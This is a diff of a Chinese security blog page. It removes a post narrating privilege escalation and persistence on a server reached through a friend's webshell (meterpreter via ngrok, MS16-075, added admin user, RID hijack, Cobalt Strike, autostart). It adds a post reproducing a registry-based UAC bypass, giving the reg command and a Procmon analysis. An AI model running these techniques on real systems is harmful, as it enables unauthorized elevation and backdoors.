@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>一次玄学提权 | 九世的博客</title>
-  <meta name="keywords" content=" windows提权 ">
-  <meta name="description" content="一次玄学提权 | 九世的博客">
+  <title>GUI_UAC_bypassX | 九世的博客</title>
+  <meta name="keywords" content=" Writing ">
+  <meta name="description" content="GUI_UAC_bypassX | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -974,9 +974,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-一次玄学提权" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-GUI-UAC-bypassX" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">一次玄学提权</h1>
+        <h1 class="article-title">GUI_UAC_bypassX</h1>
     
     <div class="article-meta">
         
@@ -985,14 +985,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color5">windows提权</a>
+            <a href="javascript:" class="color3">Writing</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-08-03 23:26:40">2019-08-03 22:50</time>
+        创建时间:<time class="date" title="更新时间: 2019-09-03 10:02:49">2019-09-03 09:34</time>
         
     </div>
     <div class="article-meta">
@@ -1014,7 +1014,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过程"><span class="toc-text">过程</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-Demon"><span class="toc-text">bypass Demon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-text">分析</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1029,32 +1029,29 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>某友扔了个shell给我，问我能不能提权，故事就这么开始了<br><img src="https://s2.ax1x.com/2019/08/03/esZdKS.png" alt="esZdKS.png"></p>
-<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>菜刀连上一看，权限小的可怕<br><img src="https://s2.ax1x.com/2019/08/03/esZ2vT.png" alt="esZ2vT.png"></p>
-<p>查看一波补丁<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://s2.ax1x.com/2019/08/03/esZo5R.png" alt="esZo5R.png"></p>
-<p>查看一下用户名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://s2.ax1x.com/2019/08/03/esZH8x.png" alt="esZH8x.png"></p>
-<p>查看一下administrators组<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://s2.ax1x.com/2019/08/03/esZXrD.png" alt="esZXrD.png"></p>
-<p>将刚刚的补丁号扔去提权辅助页面查一手exp<br><a href="https://bugs.hacking8.com/tiquan/" target="_blank" rel="noopener">提权辅助网页</a></p>
-<p><img src="https://s2.ax1x.com/2019/08/03/eseCGt.md.png" alt="eseCGt.md.png"></p>
-<p>试一波exp后发行不行，ngrok+msf获取meterpreter<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ngrok tcp 4444</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://s2.ax1x.com/2019/08/03/eseeaj.png" alt="eseeaj.png"></p>
-<p>得到meterpreter,反手就试一波getsystem,不行<br><img src="https://s2.ax1x.com/2019/08/03/eseMR0.md.png" alt="eseMR0.md.png"></p>
-<p>选择<code>/recon/local_exploit_suggester</code>模块获取一波能利用的exp,这里懒就不截图了<br>模块用法参考:<a href="https://422926799.github.io/posts/80762752.html">https://422926799.github.io/posts/80762752.html</a></p>
-<p>得到一个名为<code>MS16-075</code>的exp，用msf的试了一手，发现不行，可能是我操作错了<br><img src="https://s2.ax1x.com/2019/08/03/eseyee.png" alt="eseyee.png"></p>
-<p>然后去找exp来使<br><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075" target="_blank" rel="noopener">windows-kernel-exploits/MS16-075 at master · SecWiki/windows-kernel-exploits · GitHub</a></p>
-<p>然后第一次用的时候贼玄学，明明都已经出来了system。就是伪造不了令牌，后面一看又没了system用户<br><img src="https://s2.ax1x.com/2019/08/03/ese7wQ.png" alt="ese7wQ.png"></p>
-<p>隔几分钟后在试了一遍，提下来了<br><img src="https://s2.ax1x.com/2019/08/03/eseOWq.png" alt="eseOWq.png"></p>
-<p>反手加用户加入administrator组<br><img src="https://s2.ax1x.com/2019/08/03/esmik9.png" alt="esmik9.png"></p>
-<p>反手查询RDP端口<br><img src="https://s2.ax1x.com/2019/08/03/esmJ6f.png" alt="esmJ6f.png"></p>
-<p>反手登录RDP，然后加个RID劫持获取管理员全部数据<br><img src="https://s2.ax1x.com/2019/08/03/esmU0g.md.png" alt="esmU0g.md.png"></p>
-<p>RID劫持重新登录RDP<br><img src="https://s2.ax1x.com/2019/08/03/esmTc6.md.png" alt="esmTc6.md.png"></p>
-<p>加入cs<br><img src="https://s2.ax1x.com/2019/08/03/esmLHe.png" alt="esmLHe.png"></p>
-<p>加个开机自启<br><img src="https://s2.ax1x.com/2019/08/03/esnPu8.md.png" alt="esnPu8.md.png"></p>
-<p>持久后门文章请参考：<a href="https://422926799.github.io/posts/26a6c441.html">持久化控制学习 | 九世的博客</a></p>
-<p>完</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天晚上看群发现有人发了个新的Bypass UAC的文章。就复现了一下，顺便分析了一手= =</p>
+<p><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1568079466&amp;di=e7c9764cbd4f1276ad04682c6ecf0df2&amp;imgtype=jpg&amp;er=1&amp;src=http%3A%2F%2Fsource.upupoo.com%2Ftheme%2F1800030497%2Fpreview.jpg" alt=""></p>
+<h2 id="bypass-Demon"><a href="#bypass-Demon" class="headerlink" title="bypass Demon"></a>bypass Demon</h2><p>链接：</p>
+<p><a href="https://github.com/sailay1996/GUI_UAC_bypassX/blob/master/README.md" target="_blank" rel="noopener">https://github.com/sailay1996/GUI_UAC_bypassX/blob/master/README.md</a></p>
+<p>然后惊人的发现执行的命令和今年1月的命令一毛一样。什么是忍甲，这就是忍甲</p>
+<p><img src="https://s2.ax1x.com/2019/09/03/nFnz11.png" alt=""></p>
+<p>​        <a href="https://zhuanlan.zhihu.com/p/55728445" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/55728445</a></p>
+<p><img src="https://s2.ax1x.com/2019/09/03/nFuZ9A.png" alt=""></p>
+<p>执行以下命令并打开<strong>netplwiz.exe</strong>然后找到高级点击管理密码，就会弹出个cmd</p>
+<p><code>reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; /d &quot;cmd.exe /c cmd.exe&quot; /f &amp;&amp; reg add HKCU\Software\Classes\Folder\shell\open\command /v &quot;DelegateExecute&quot; /f</code> </p>
+<p><img src="https://s2.ax1x.com/2019/09/03/nFKe54.png" alt=""></p>
+<p>还原注册表：<code>reg delete &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; /f</code> </p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>打开Procmon.exe配置以下过滤</p>
+<p><img src="https://s2.ax1x.com/2019/09/03/nFM8ln.png" alt=""></p>
+<p>然后搜索command关键字</p>
+<p><img src="https://s2.ax1x.com/2019/09/03/nFMq78.png" alt=""></p>
+<p>大概的搜了一下HKCR注册表（忘了）</p>
+<p><img src="https://s2.ax1x.com/2019/09/03/nFQ63j.png" alt=""></p>
+<p>执行上面的命令在看了一下刚刚的那个位置发现被加载成功了</p>
+<p><img src="https://s2.ax1x.com/2019/09/03/nFQz5D.png" alt=""></p>
+<p>针对<code>HKCU\Software\Classes\Folder\shell\open\command</code>路径看了一下，发现执行了以上的命令打开上面文件夹，盘符等等。全部会执行你那个路径里设置的进程</p>
+<p><img src="https://s2.ax1x.com/2019/09/03/nFloeP.png" alt=""></p>
+<p>后面问了某gay友知道<code>HKCU\Software\Classes\Folder\shel</code>这个路径是windows配置的。至于为什么会出现文件夹和盘符都是执行路径里设置的进程。我bu de而知</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1064,12 +1061,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>一次玄学提权</p>
+    <p><span class="copy-title">文章标题:</span>GUI_UAC_bypassX</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="9most">9most</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-08-03, 22:50:34</p>
-    <p><span class="copy-title">最后更新:</span>2019-08-03, 23:26:40</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/589f1dca.html" title="一次玄学提权">http://422926799.github.io/posts/589f1dca.html</a>
+    <p><span class="copy-title">发布时间:</span>2019-09-03, 09:34:39</p>
+    <p><span class="copy-title">最后更新:</span>2019-09-03, 10:02:49</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/3fa71b88.html" title="GUI_UAC_bypassX">http://422926799.github.io/posts/3fa71b88.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
